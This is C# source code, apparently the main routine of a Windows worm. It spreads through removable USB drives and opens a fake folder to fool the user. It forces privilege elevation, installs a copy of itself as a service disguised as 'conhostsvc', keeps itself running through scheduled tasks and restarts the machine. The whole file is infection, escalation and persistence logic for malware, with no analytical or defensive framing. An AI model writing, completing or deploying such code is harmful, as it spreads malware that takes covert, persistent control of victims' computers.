using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.ServiceProcess;

namespace zort
{
    class Program : ServiceBase
    {
        public const string SERVICE_NAME = "conhostsvc";
        public const string TASK_NAME = "PookieBearUwU";
        public Program()
        {
            ServiceName = SERVICE_NAME;
        }

        public enum ExecutionState
        {
            Usb,
            Pookie,
            Service,
            Unknown
        }

        public static bool IsTaskSet()
        {
            using (var taskService = new Microsoft.Win32.TaskScheduler.TaskService())
            {
                var task = taskService.FindTask(TASK_NAME);
                return task != null;
            }
        }

        static void Main(string[] args)
        {
            Program program = new Program();
            if (Environment.UserInteractive)
            {
                // Run as console application
                program.OnStart(args);
                Console.WriteLine("Press any key to stop...");
                Console.ReadKey();
                program.OnStop();
            }
            else
            {
                // Run as Windows Service
                Run(program);
            }
        }

        private static ExecutionState GetExecutionState()
        {
            if (RemovableInfector.IsRunningFromInfectedUsb()) return ExecutionState.Usb;
            if (PookieHelper.AmIPookie()) return ExecutionState.Pookie;
            if (ServiceHelper.AmIService()) return ExecutionState.Service;
            return ExecutionState.Unknown;
        }

        private void UsbRoutine()
        {
            RemovableInfector.OpenFakeFolderIfRunningFromInfectedUsb();
            if (PookieHelper.PookieExists())
            {
                if (!PookieHelper.IsPookieRunning())
                {
                    string pookiePath = PookieHelper.GetPookiePath();
                    Process.Start(pookiePath);
                }
                Exit();
            }
            else
            {
                PookieHelper.CreatePookie();
                string pookiePath = PookieHelper.GetPookiePath();
                ElevationHelper.ForceElevate(pookiePath);
                Exit();
            }
        }

        protected override void OnStart(string[] args)
        {
            var executionState = GetExecutionState();
            Console.WriteLine($"Execution state: {executionState}");
            switch (executionState)
            {
                case ExecutionState.Usb:
                    UsbRoutine();
                    break;
                case ExecutionState.Pookie:
                    PookieRoutine();
                    break;
                case ExecutionState.Service:
                    Console.WriteLine("YIPPIE!!");
                    break;
            }
        }

        private void PookieRoutine()
        {
            if (PookieHelper.PookieMutex.Exists()) //also creates the mutex
            {
                Exit();
            }

            bool isAdmin = ElevationHelper.IsElevated();
            if (isAdmin)
            {
                if (ServiceHelper.IsServiceInstalled())
                {
                    if (!ServiceHelper.IsServiceRunning()) ServiceHelper.StartService();
                    PookieHelper.PookieMutex.Release();
                    Exit();
                    return;
                }

                string clonePath = ServiceHelper.CreateItITClone();
                ServiceHelper.InstallService(clonePath);
                PookieHelper.PookieMutex.Release();

                if (PookieHelper.Tasks.StartAtLogon.Exists()) PookieHelper.Tasks.StartAtLogon.Remove();
                if (PookieHelper.Tasks.DeletePookieAtNextLogon.Exists()) PookieHelper.Tasks.DeletePookieAtNextLogon.Remove();
                PookieHelper.Tasks.DeletePookieAtNextLogon.Create();
                Util.RestartComputer();
                Exit();
                return;
            }
            else
            {
                string pookiePath = PookieHelper.GetPookiePath(); //also my path!!
                ElevationHelper.ForceElevate(pookiePath);
                PookieHelper.PookieMutex.Release();
                Exit();
                return;
            }
        }

        private void Exit()
        {
            Environment.Exit(0);
        }

        protected override void OnStop()
        {

        }

        protected override void OnPause()
        {

        }

        protected override void OnContinue()
        {

        }
    }
}
